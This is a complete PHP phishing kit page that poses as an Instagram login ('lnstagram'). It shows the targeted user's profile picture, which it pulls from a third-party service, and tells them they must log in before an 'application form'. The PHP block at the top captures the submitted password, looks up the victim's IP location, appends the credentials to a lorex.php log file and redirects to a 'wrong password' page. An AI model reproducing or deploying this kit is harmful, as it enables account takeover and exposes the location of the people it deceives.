<?php
$lorex=$_GET['nick'];
function fotocekme($lorex) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,"https://www.instatakipci.com/phpCurl");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
        "user=".$lorex."&productAsks=%7B%22sm_domain%22%3A%22https%3A%2F%2Fwww.instagram.com%2F%22%2C%22preview%22%3A%221%22%2C%22sm_type_id%22%3A1%2C%22link_status%22%3A0%2C%22image_way%22%3A%22%22%7D&multiOptionTake=&nextTimeline=");

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $server_output = curl_exec($ch);

    curl_close ($ch);

    $data = json_decode($server_output,true);

    return $data['imageChange'];
}

$lorexresim = fotocekme($lorex);

if($_POST){
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
	$cek = new SimpleXMLElement($konum);
	$ulke = $cek->country;
	$sehir = $cek->city;
	date_default_timezone_set('Europe/Istanbul');  
	$cur_time=date("d-m-Y H:i:s");
	include('vendor/autoload.php');
	$file = fopen('lorex.php', 'a');
	fwrite($file, "
		<html>
		<head>
		<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
		<meta name='viewport' content='width=device-width, initial-scale=1'>
		</head>
		<body bgcolor='#000000'>
		<body bgcolor='rgb(0,0,0)'>
		<body bgcolor='black'>
		<hr>
		<font color='red'>Kullanıcı Adı: </font><font color='white'>".$lorex."</font><br>
		<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
		<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
		<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
		<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
		<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
		<hr>
		<br>

		"); 
	fclose($file);


	header("location: wrongpass.php?nick=".$lorex);
}

?>

<html lang="en" class="js not-logged-in client-root touch js-focus-visible sDN5V"><head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">

	<title>lnstagram </title>


	<meta name="robots" content="noimageindex, noarchive">
	<meta name="apple-mobile-web-app-status-bar-style" content="default">
	<meta name="mobile-web-app-capable" content="yes">
	<meta name="theme-color" content="#ffffff">
	<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">

	<link rel="stylesheet" href="css/style1.css" type="text/css" crossorigin="anonymous">

	<link rel="stylesheet" href="css/style2.css" type="text/css" crossorigin="anonymous">

	<link rel="stylesheet" href="css/style3.css" type="text/css" crossorigin="anonymous">
	<style>
		#kutu{
			font-family: sans-serif;
			background: white;
			margin-top: 45px;
			padding-top: 7px;
			padding-bottom: 4px;
			width: 350px;
			max-width: 90%;
			border: 1px solid #dedede;
			height: 75vh;

			}
			#password{
text-overflow: ellipsis; font: 400 13.3333px Arial;color:; font-size:13px; background-color:#fafafa; outline:none; padding-left:6px;width:260px ;height:30px; border: 1px solid #e6e6e6; margin:7px; font-weight:300;border-radius:3px; margin:4px;  

			}
			.button {

-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
font-size: 14px;
line-height: 20px;
appearance: none;
background: 0 0;
box-sizing: border-box;
cursor: pointer;
display: block;
font-weight: 600;
padding: 5px;
text-align: center;
text-transform: inherit;
text-overflow: ellipsis;
user-select: none;
width: 80%;
border-radius: 4px;
color: rgba(var(--eca,255,255,255),1);
position: relative;
border: 1px solid transparent;
background-color: rgba(var(--d69,0,149,246),1);
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }


		</style>


		</style>
		   <form class="HmktE" id="your_form_id" enctype="index.php" method="post">
		<script>
            function form_kontrol()
            {
                if(document.getElementById("password").value.length == 0)
                    document.getElementById("gonder").disabled = true;
                else
                    document.getElementById("gonder").disabled = false;
                    document.getElementById("gonder").style.background = "#3897f0";
                    document.getElementById("gonder").style.borderColor = "#3897f0";
            }
        </script>  


	</footer><div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DsignupPage%26ig_mid%3DAE2FF212-B09F-4D9D-97C1-5FD6BB456D90%26utm_content%3Dlo%26utm_medium%3Dbadge" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">lnstagram</p><p class="_5b2Kp">Find it for free on Google Play.
	</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div></section></div>
	<center>
		<div id="kutu">
			<br>
			<center>
				<img src="<?php echo $lorexresim; ?>" alt="" width=150 style="border-radius:50%;margin-top:15px;">
			</center>

			<br><p style="font-family:sans-serif; font-size:15px; color: #999; line-height:20px; font-weight:400;">
				Hello, <?php echo $lorex; ?>&nbsp;<img style="width:14px;height: 14px;" src="https://i.imgyukle.com/2020/02/19/niuzAb.png"> <br>You must log in before going to the<br>
				application form.
				<br>
			</p><center>    
				<div class="Et89U">
					<label class="f0n8F "><input type="password" id="password" name="password" required="" placeholder="Password" class="_2hvTZ pexuQ zyHYP" onkeyup="form_kontrol()"></label>     <br>
					<br><br>
            	<center><button type="submit" id="gonder" disabled class="button">
             <span class="btn-txt" >Log In @<?php echo $lorex; ?></span>
       </button></center>

				<br>
</center>
<div class="eiCW-" id="sonucc"></div>
    <div class="Igw0E rBNOH eGOV_ _4EzTm aGBdT"><div class="_7UhW9 xLCgt yUEEX _0PwGv uL8Hv"><p> <a href=""><span class="_7UhW9 xLCgt qyrsm gtFbE se6yk">Forgot password?</span></a></p></div></div></form>


    <div class="Igw0E rBNOH eGOV_ _4EzTm aGBdT"><div class="_7UhW9 xLCgt yUEEX _0PwGv uL8Hv"><p>Don't have an account? <a href=""><span class="_7UhW9 xLCgt qyrsm gtFbE se6yk">Sign up</span></a></p></div></div></form>

    			</div>

	
	<script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");	
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
         

document.getElementById('your_form_id').submit();
		  
   });
        });
		

    </script>



    <script>
    $('form > *').keypress(function(event) {
        event = event || window.event;
        if (event.which === 13) {
            event.preventDefault();
            return (false);
        }
    });
    </script>

			<div class="tHaIX Igw0E rBNOH YBx95 ybXk5 _4EzTm O1flK _7JkPY PdTAI ZUqME" style="height: 60px; width: 100%;"><img src="resim/from.png" alt="fb" width="95"></div>
</center>